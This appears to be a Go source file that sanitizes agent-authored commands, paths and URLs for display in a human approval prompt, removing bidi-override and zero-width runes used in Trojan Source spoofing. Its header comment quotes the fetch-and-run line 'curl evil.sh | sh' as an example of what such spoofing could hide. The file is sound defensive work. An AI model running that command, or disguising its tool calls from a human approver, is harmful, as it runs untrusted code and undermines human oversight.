// Package sanitize turns agent-authored text into something safe to render.
//
// The text this handles — a Bash command, a file path, a URL — reaches a human
// who is deciding whether to let it run. A bidi override (U+202E) renders
// "curl evil.sh | sh" as innocuous reversed text, and a zero-width space hides
// a word boundary; both are Trojan Source, CVE-2021-42574.
//
// It lives in its own package because there are two boundaries, not one: the
// parser reads tool calls out of the session transcript, and the permission
// bridge reads them from the PreToolUse hook payload. The second was added
// later and did not inherit the rule — so the protection sat on the passive
// trail in the modal while the text next to the approve button stayed raw.
package sanitize

import (
	"strings"
	"unicode"
	"unicode/utf8"
)

// ForDisplay returns s as a single render-safe line: control, bidi-override and
// other format runes removed, remaining whitespace collapsed.
func ForDisplay(s string) string {
	out, _ := ForDisplayCapped(s, -1)
	return out
}

// ForDisplayCapped is ForDisplay with a cap on the result, in runes. It returns
// the kept text and how many runes were dropped; a maxRunes below zero means no
// cap and always reports 0 dropped.
//
// The cut is counted, not marked. A marker inside the text is one the text can
// forge: an agent-authored command ending in "… (+400 chars)" would otherwise
// read as a server-truncated prefix of something longer. Callers carry the count
// as its own value.
//
// One pass, and only the kept runes are ever copied — the earlier version built
// the whole sanitized string before applying the cap, so a multi-kilobyte inline
// script was scanned and copied in full to produce 120 runes.
func ForDisplayCapped(s string, maxRunes int) (string, int) {
	var b strings.Builder
	// The result is never longer than the input, and at most maxRunes runes.
	if maxRunes >= 0 && maxRunes < len(s) {
		b.Grow(maxRunes * utf8.UTFMax)
	} else {
		b.Grow(len(s))
	}

	kept, dropped := 0, 0
	// pendingSpace defers a collapsed whitespace run so the result never starts
	// or ends with one, which is what strings.Fields did before.
	pendingSpace := false
	// Once the cap is reached everything after it is dropped. Without this a
	// shorter rune would still fit after a longer one had been refused, and the
	// result would be a filtered selection rather than a prefix of the input.
	capped := false

	for _, r := range s {
		switch {
		case unicode.IsSpace(r):
			if kept > 0 {
				pendingSpace = true
			}
			continue
		case unicode.IsControl(r), unicode.Is(unicode.Cf, r):
			// Bidi controls are all category Cf, so the Cf test alone covers
			// them; IsControl adds the C0/C1 range, which Cf does not.
			continue
		}

		if capped {
			dropped++
			continue
		}
		width := 1
		if pendingSpace {
			width = 2 // the separator plus this rune
		}
		if maxRunes >= 0 && kept+width > maxRunes {
			capped = true
			dropped++
			pendingSpace = false
			continue
		}
		if pendingSpace {
			b.WriteByte(' ')
			kept++
			pendingSpace = false
		}
		b.WriteRune(r)
		kept++
	}
	return b.String(), dropped
}
